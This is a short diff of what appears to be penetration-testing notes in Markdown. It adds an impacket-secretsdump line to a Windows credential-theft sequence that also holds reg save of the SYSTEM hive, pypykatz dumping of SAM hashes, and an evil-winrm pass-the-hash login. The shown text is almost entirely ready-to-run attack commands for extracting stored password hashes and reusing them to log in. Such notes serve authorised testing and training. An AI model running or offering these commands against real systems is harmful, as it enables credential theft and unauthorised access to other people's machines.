@@ -168,6 +168,7 @@ reg save hklm\system c:\Temp\system
 
 ```bash
 pypykatz registry --sam sam system
+impacket-secretsdump -sam sam -system system
 
 evil-winrm -i <ip> -u <user> -H <hash>
 ```
